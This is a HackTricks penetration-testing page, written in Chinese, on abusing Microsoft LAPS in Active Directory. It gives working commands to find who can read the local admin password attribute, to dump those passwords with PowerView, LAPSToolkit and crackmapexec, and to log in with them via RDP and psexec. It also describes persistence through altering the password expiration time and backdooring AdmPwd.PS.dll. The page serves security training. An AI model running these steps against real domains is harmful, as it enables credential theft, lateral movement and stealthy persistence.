# LAPS

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## 基本信息

Local Administrator Password Solution (LAPS) 是一个用于管理系统的工具，其中 **管理员密码** 是 **唯一的、随机生成的，并且经常更改**，适用于加入域的计算机。这些密码安全地存储在 Active Directory 中，仅对通过访问控制列表 (ACL) 获得权限的用户可访问。客户端到服务器的密码传输安全性通过使用 **Kerberos 版本 5** 和 **高级加密标准 (AES)** 得到保障。

在域的计算机对象中，LAPS 的实施导致添加两个新属性：**`ms-mcs-AdmPwd`** 和 **`ms-mcs-AdmPwdExpirationTime`**。这些属性分别存储 **明文管理员密码** 和 **其过期时间**。

### 检查是否已激活
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### LAPS 密码访问

您可以从 `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` **下载原始 LAPS 策略**，然后使用 [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) 包中的 **`Parse-PolFile`** 将此文件转换为人类可读的格式。

此外，如果在我们可以访问的机器上安装了 **本地 LAPS PowerShell cmdlets**，也可以使用它们：
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** 还可以用来找出 **谁可以读取密码并读取它**：
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) 通过多个功能促进了 LAPS 的枚举。\
其中之一是解析 **`ExtendedRights`** 以获取 **所有启用 LAPS 的计算机。** 这将显示 **专门被委派读取 LAPS 密码的组，** 这些组通常是受保护组中的用户。\
一个 **已将计算机** 加入域的 **帐户** 在该主机上获得 `All Extended Rights`，而这个权限赋予 **帐户** 读取 **密码** 的能力。枚举可能会显示一个可以在主机上读取 LAPS 密码的用户帐户。这可以帮助我们 **针对特定的 AD 用户**，他们可以读取 LAPS 密码。
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **通过 Crackmapexec 转储 LAPS 密码**

如果无法访问 PowerShell，您可以通过 LDAP 远程滥用此权限。
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
这将转储用户可以读取的所有密码，使您能够以不同的用户获得更好的立足点。

## ** 使用 LAPS 密码 **
```
xfreerdp /v:192.168.1.1:3389  /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## **LAPS 持久性**

### **到期日期**

一旦成为管理员，可以通过**将到期日期设置为未来**来**获取密码**并**防止**机器**更新**其**密码**。
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
> [!WARNING]
> 如果 **admin** 使用 **`Reset-AdmPwdPassword`** cmdlet，或者在 LAPS GPO 中启用了 **Do not allow password expiration time longer than required by policy**，密码仍然会被重置。

### 后门

LAPS 的原始源代码可以在 [这里](https://github.com/GreyCorbel/admpwd) 找到，因此可以在代码中放置一个后门（例如在 `Main/AdmPwd.PS/Main.cs` 中的 `Get-AdmPwdPassword` 方法内），以某种方式 **提取新密码或将其存储在某处**。

然后，只需编译新的 `AdmPwd.PS.dll` 并将其上传到机器中的 `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll`（并更改修改时间）。

## 参考

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{{#include ../../banners/hacktricks-training.md}}
